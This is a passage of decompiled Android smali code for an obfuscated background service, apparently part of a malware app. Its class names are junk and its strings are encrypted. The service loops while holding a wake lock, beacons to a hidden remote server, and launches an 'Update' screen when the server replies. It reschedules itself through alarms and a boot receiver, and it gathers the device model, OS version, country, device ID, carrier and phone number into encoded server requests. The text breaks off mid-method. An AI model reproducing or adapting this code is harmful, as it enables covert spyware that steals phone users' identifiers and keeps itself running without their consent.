.class public Lcompse/refact/st/upsssss/Comm;
.super Landroid/app/IntentService;


# static fields
.field private static eryryhrtytujrtujrurt:Ljava/util/concurrent/atomic/AtomicBoolean;

.field static fsafsdfsfsdfsfsdfsd:Ljava/lang/Object;


# instance fields
.field hukuiluliulu:Ljava/lang/Object;

.field sdfsdfsdfsdf:Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;

.field sdvsdvsvsevsvsev:Landroid/content/Context;

.field serfwefewfwefewef:Lcompse/refact/st/upsssss/serfwefewfwefewef;

.field public zxcvxvsdvsvsvs:Ljava/lang/Integer;


# direct methods
.method static constructor <clinit>()V
    .locals 2

    new-instance v0, Ljava/util/concurrent/atomic/AtomicBoolean;

    const/4 v1, 0x0

    invoke-direct {v0, v1}, Ljava/util/concurrent/atomic/AtomicBoolean;-><init>(Z)V

    sput-object v0, Lcompse/refact/st/upsssss/Comm;->eryryhrtytujrtujrurt:Ljava/util/concurrent/atomic/AtomicBoolean;

    new-instance v0, Lcompse/refact/st/upsssss/eryryhrtytujrtujrurt;

    invoke-direct {v0}, Lcompse/refact/st/upsssss/eryryhrtytujrtujrurt;-><init>()V

    invoke-virtual {v0}, Lcompse/refact/st/upsssss/eryryhrtytujrtujrurt;->toString()Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcompse/refact/st/upsssss/Comm;->fsafsdfsfsdfsfsdfsd:Ljava/lang/Object;

    return-void
.end method

.method public constructor <init>()V
    .locals 2

    const/16 v0, 0x3c

    const-string v1, "j9i!j%"

    invoke-static {v1}, Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/f;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-direct {p0, v1}, Landroid/app/IntentService;-><init>(Ljava/lang/String;)V

    sget-object v1, Lcompse/refact/st/upsssss/Comm;->fsafsdfsfsdfsfsdfsd:Ljava/lang/Object;

    iput-object v1, p0, Lcompse/refact/st/upsssss/Comm;->hukuiluliulu:Ljava/lang/Object;

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    iput-object v0, p0, Lcompse/refact/st/upsssss/Comm;->zxcvxvsdvsvsvs:Ljava/lang/Integer;

    new-instance v0, Lcompse/refact/st/upsssss/serfwefewfwefewef;

    invoke-direct {v0}, Lcompse/refact/st/upsssss/serfwefewfwefewef;-><init>()V

    iput-object v0, p0, Lcompse/refact/st/upsssss/Comm;->serfwefewfwefewef:Lcompse/refact/st/upsssss/serfwefewfwefewef;

    new-instance v0, Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;

    invoke-direct {v0}, Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;-><init>()V

    iput-object v0, p0, Lcompse/refact/st/upsssss/Comm;->sdfsdfsdfsdf:Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;

    return-void
.end method


# virtual methods
.method public fsafsdfsfsdfsfsdfsd()V
    .locals 12

    const/4 v11, 0x1

    const/4 v10, 0x0

    :goto_0
    const-string v0, "0h7b2"

    invoke-static {v0}, Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/f;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0}, Lcompse/refact/st/upsssss/Comm;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/os/PowerManager;

    const-string v1, ""

    invoke-virtual {v0, v11, v1}, Landroid/os/PowerManager;->newWakeLock(ILjava/lang/String;)Landroid/os/PowerManager$WakeLock;

    move-result-object v1

    invoke-virtual {v1}, Landroid/os/PowerManager$WakeLock;->acquire()V

    sget-object v0, Lcompse/refact/st/upsssss/Comm;->eryryhrtytujrtujrurt:Ljava/util/concurrent/atomic/AtomicBoolean;

    invoke-virtual {v0, v11}, Ljava/util/concurrent/atomic/AtomicBoolean;->set(Z)V

    iget-object v0, p0, Lcompse/refact/st/upsssss/Comm;->sdvsdvsvsevsvsev:Landroid/content/Context;

    const-string v0, "\u00110\u00032\u000f4\u00081"

    invoke-static {v0}, Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/g;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0}, Lcompse/refact/st/upsssss/Comm;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/KeyguardManager;

    invoke-virtual {v0}, Landroid/app/KeyguardManager;->inKeyguardRestrictedInputMode()Z

    move-result v0

    const-string v2, "p"

    invoke-static {v2}, Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/f;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    if-ne v0, v11, :cond_2

    const-string v0, "e"

    invoke-static {v0}, Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/g;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    :goto_1
    const-string v2, "9\u00151\u001f\'"

    invoke-static {v2}, Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/g;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {p0}, Lcompse/refact/st/upsssss/Comm;->zxcvxvsdvsvsvs()Ljava/lang/String;

    move-result-object v3

    iget-object v4, p0, Lcompse/refact/st/upsssss/Comm;->serfwefewfwefewef:Lcompse/refact/st/upsssss/serfwefewfwefewef;

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v6, p0, Lcompse/refact/st/upsssss/Comm;->hukuiluliulu:Ljava/lang/Object;

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, "!O\u00127#C/q\u000c58q!5+r\"~y}\u001aj\u0012}\u001a@\u001a}\u001a@\u0019q\u001a5\u00067\u001aTup!O\u0001\"sCfo,:sb$"

    invoke-static {v6}, Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/f;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "\nh"

    invoke-static {v7}, Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/g;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v10, v7}, Ljava/lang/StringBuilder;->insert(ILjava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    iget-object v7, p0, Lcompse/refact/st/upsssss/Comm;->sdfsdfsdfsdf:Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;

    new-instance v8, Ljava/lang/StringBuilder;

    invoke-direct {v8}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v9, p0, Lcompse/refact/st/upsssss/Comm;->sdfsdfsdfsdf:Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;

    invoke-virtual {v9, p0}, Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;->fsafsdfsfsdfsfsdfsd(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v10, v9}, Ljava/lang/StringBuilder;->insert(ILjava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, "z"

    invoke-static {v9}, Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/f;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v8, "o"

    invoke-static {v8}, Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/g;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v2, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v2, "z"

    invoke-static {v2}, Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/f;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v7, v0}, Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;->zxcvxvsdvsvsvs(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v6, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v4, v5, v0}, Lcompse/refact/st/upsssss/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    iget-object v2, p0, Lcompse/refact/st/upsssss/Comm;->sdfsdfsdfsdf:Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;

    invoke-virtual {v2, v0}, Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;->sdfsdfsdfsdf(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v2, "\u0006\u001b5)"

    invoke-static {v2}, Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/g;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-ne v0, v11, :cond_0

    invoke-virtual {p0}, Lcompse/refact/st/upsssss/Comm;->sdfsdfsdfsdf()V

    :cond_0
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v2, p0, Lcompse/refact/st/upsssss/Comm;->hukuiluliulu:Ljava/lang/Object;

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v2, "!O\u00127#C/q\u000c58q!5+r\"~yo#O\u0001r\u0019_\u0002ufo,:sb$"

    invoke-static {v2}, Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/f;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    new-instance v2, Ljava/net/URL;

    invoke-direct {v2, v0}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v0

    check-cast v0, Ljava/net/HttpURLConnection;

    invoke-virtual {v0}, Ljava/net/HttpURLConnection;->getResponseCode()I

    move-result v0

    const/16 v2, 0xc8

    if-ne v0, v2, :cond_1

    new-instance v0, Landroid/content/Intent;

    const-class v2, Lcompse/refact/st/upsssss/Update;

    invoke-direct {v0, p0, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 v2, 0x10000000

    invoke-virtual {v0, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {p0, v0}, Lcompse/refact/st/upsssss/Comm;->startActivity(Landroid/content/Intent;)V

    :cond_1
    sget-object v0, Lcompse/refact/st/upsssss/Comm;->eryryhrtytujrtujrurt:Ljava/util/concurrent/atomic/AtomicBoolean;

    invoke-virtual {v0, v10}, Ljava/util/concurrent/atomic/AtomicBoolean;->set(Z)V

    invoke-virtual {v1}, Landroid/os/PowerManager$WakeLock;->release()V

    new-instance v0, Landroid/content/Intent;

    iget-object v1, p0, Lcompse/refact/st/upsssss/Comm;->sdvsdvsvsevsvsev:Landroid/content/Context;

    const-class v2, Lcompse/refact/st/upsssss/Boot;

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    iget-object v1, p0, Lcompse/refact/st/upsssss/Comm;->sdvsdvsvsevsvsev:Landroid/content/Context;

    invoke-static {v1, v10, v0, v10}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v1

    iget-object v0, p0, Lcompse/refact/st/upsssss/Comm;->sdvsdvsvsevsvsev:Landroid/content/Context;

    const-string v2, "4\u00164\u00088"

    invoke-static {v2}, Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/g;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/AlarmManager;

    invoke-virtual {v0, v1}, Landroid/app/AlarmManager;->cancel(Landroid/app/PendingIntent;)V

    :try_start_0
    sget-object v0, Ljava/util/concurrent/TimeUnit;->SECONDS:Ljava/util/concurrent/TimeUnit;

    iget-object v1, p0, Lcompse/refact/st/upsssss/Comm;->zxcvxvsdvsvsvs:Ljava/lang/Integer;

    invoke-static {v1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Ljava/lang/Long;->parseLong(Ljava/lang/String;)J

    move-result-wide v2

    invoke-virtual {v0, v2, v3}, Ljava/util/concurrent/TimeUnit;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0

    goto/16 :goto_0

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/InterruptedException;->printStackTrace()V

    goto/16 :goto_0

    :cond_2
    const-string v0, "q"

    invoke-static {v0}, Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/f;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    goto/16 :goto_1
.end method

.method public onCreate()V
    .locals 0

    invoke-super {p0}, Landroid/app/IntentService;->onCreate()V

    return-void
.end method

.method protected onHandleIntent(Landroid/content/Intent;)V
    .locals 1

    iput-object p0, p0, Lcompse/refact/st/upsssss/Comm;->sdvsdvsvsevsvsev:Landroid/content/Context;

    :try_start_0
    invoke-virtual {p0}, Lcompse/refact/st/upsssss/Comm;->fsafsdfsfsdfsfsdfsd()V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    return-void

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_0
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 1

    const/4 v0, 0x1

    invoke-super {p0, p1, p2, p3}, Landroid/app/IntentService;->onStartCommand(Landroid/content/Intent;II)I

    return v0
.end method

.method public sdfsdfsdfsdf()V
    .locals 14

    const/4 v13, 0x0

    const-string v0, "l%~\'r!u$"

    iget-object v1, p0, Lcompse/refact/st/upsssss/Comm;->sdvsdvsvsevsvsev:Landroid/content/Context;

    invoke-static {v0}, Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/f;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0}, Lcompse/refact/st/upsssss/Comm;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/KeyguardManager;

    invoke-virtual {v0}, Landroid/app/KeyguardManager;->inKeyguardRestrictedInputMode()Z

    move-result v0

    const-string v1, "e"

    invoke-static {v1}, Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/g;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    const/4 v1, 0x1

    if-ne v0, v1, :cond_0

    const-string v0, "p"

    invoke-static {v0}, Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/f;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    move-object v1, v0

    move-object v0, p0

    :goto_0
    invoke-virtual {v0}, Lcompse/refact/st/upsssss/Comm;->zxcvxvsdvsvsvs()Ljava/lang/String;

    move-result-object v0

    const-string v2, ",h$b2"

    invoke-static {v2}, Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/f;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    const-string v2, "0o/i%"

    iget-object v4, p0, Lcompse/refact/st/upsssss/Comm;->serfwefewfwefewef:Lcompse/refact/st/upsssss/serfwefewfwefewef;

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v6, p0, Lcompse/refact/st/upsssss/Comm;->hukuiluliulu:Ljava/lang/Object;

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, "42\u0007J6>:\u000c\u0019H-\u000c4H>\u000f7\u0003l\u0000\u000f\u0017\u0007\u0000\u000f=\u000f\u0000\u000f=\u000c\u000c\u000fH\u0013J\u000f)`\r42\u0014_f>s\u00129Gf\u001f1"

    invoke-static {v6}, Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/g;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "w}"

    invoke-static {v7}, Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/f;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v13, v7}, Ljava/lang/StringBuilder;->insert(ILjava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    iget-object v7, p0, Lcompse/refact/st/upsssss/Comm;->sdfsdfsdfsdf:Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;

    new-instance v8, Ljava/lang/StringBuilder;

    invoke-direct {v8}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v9, p0, Lcompse/refact/st/upsssss/Comm;->sdfsdfsdfsdf:Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;

    invoke-virtual {v9, p0}, Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;->fsafsdfsfsdfsfsdfsd(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v13, v9}, Ljava/lang/StringBuilder;->insert(ILjava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, "o"

    invoke-static {v9}, Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/g;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, "z"

    invoke-static {v9}, Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/f;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v8, "o"

    invoke-static {v8}, Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/g;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v1, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v7, v0}, Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;->zxcvxvsdvsvsvs(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v6, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v4, v5, v0}, Lcompse/refact/st/upsssss/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    invoke-static {v2}, Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/f;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0}, Lcompse/refact/st/upsssss/Comm;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/telephony/TelephonyManager;

    const-string v1, ""

    const-string v1, ""

    const-string v2, ""

    const-string v2, ";\u0015!"

    invoke-static {v2}, Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/g;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    sget-object v5, Landroid/os/Build$VERSION;->RELEASE:Ljava/lang/String;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v6, Landroid/os/Build;->MODEL:Ljava/lang/String;

    invoke-virtual {v2, v13, v6}, Ljava/lang/StringBuilder;->insert(ILjava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    sget-object v6, Landroid/os/Build;->PRODUCT:Ljava/lang/String;

    invoke-virtual {v2, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getNetworkCountryIso()Ljava/lang/String;

    move-result-object v7

    sget v2, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v8, 0x17

    if-ge v2, v8, :cond_1

    invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getNetworkOperatorName()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v2, v13, v8}, Ljava/lang/StringBuilder;->insert(ILjava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getLine1Number()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    move-object v2, v0

    move-object v0, p0

    :goto_1
    iget-object v0, v0, Lcompse/refact/st/upsssss/Comm;->serfwefewfwefewef:Lcompse/refact/st/upsssss/serfwefewfwefewef;

    new-instance v8, Ljava/lang/StringBuilder;

    invoke-direct {v8}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v9, p0, Lcompse/refact/st/upsssss/Comm;->hukuiluliulu:Ljava/lang/Object;

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, "!O\u00127#C/q\u000c58q!5+r\"~y}\u001aj\u0012}\u001a@\u001a}\u001a@\u0019q#j\u0016i\u000ci\u0002h#Fe4\u0004\"sCfo,:sb$"

    invoke-static {v9}, Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/f;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    new-instance v9, Ljava/lang/StringBuilder;

    invoke-direct {v9}, Ljava/lang/StringBuilder;-><init>()V

    const-string v10, "\nh"

    invoke-static {v10}, Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/g;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v9, v13, v10}, Ljava/lang/StringBuilder;->insert(ILjava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    iget-object v10, p0, Lcompse/refact/st/upsssss/Comm;->sdfsdfsdfsdf:Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;

    new-instance v11, Ljava/lang/StringBuilder;

    invoke-direct {v11}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v12, p0, Lcompse/refact/st/upsssss/Comm;->sdfsdfsdfsdf:Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;

    invoke-virtual {v12, p0}, Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;->fsafsdfsfsdfsfsdfsd(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v11, v13, v12}, Ljava/lang/StringBuilder;->insert(ILjava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v11

    const-string v12, "z"

    invoke-static {v12}, Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/f;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v11

    invoke-virtual {v11, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "o"

    invoke-static {v2}, Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/g;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "z"

    invoke-static {v2}, Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/f;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "o"

